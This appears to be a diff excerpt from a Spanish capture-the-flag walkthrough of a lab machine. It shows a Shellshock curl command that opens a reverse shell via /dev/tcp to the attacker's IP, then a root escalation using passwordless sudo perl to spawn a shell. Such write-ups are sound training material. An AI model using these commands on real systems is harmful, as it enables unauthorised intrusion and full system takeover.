@@ -108,3 +108,19 @@ Ahora ganamos la shell
 ```
 curl -H "User-Agent: () { :; }; echo; /bin/bash -c 'bash -l >& /dev/tcp/(nuestra ip)/443 0>&1" http://10.10.10.56/cgi-bin/user.sh
 ```
+Hacemos un tratamiento de la TTY (Tengo un articulo explicando como hacer un tratamiento de la  TTY)
+
+Realizado el tratamiento de la  TTY tendriamos acceso a la maquina con el usuario shelly y tendriamos acceso a la flag del usuario.
+## Escala de privilegios 
+Con el comando 
+```
+sudo -l
+```
+podemos ver que el usuario root permite ejecutar el comando perl sin necesidad de contraseña
+esta pagina nos muestra algunos comandos para escalar privilegios segun los comandos que se nos permita ejecutar
+https://gtfobins.github.io/
+
+Podemos ver que podemos ejecutar un comando perl para poder escalar privilegios
+```
+sudo perl -e 'exec "/bin/sh";'
+```
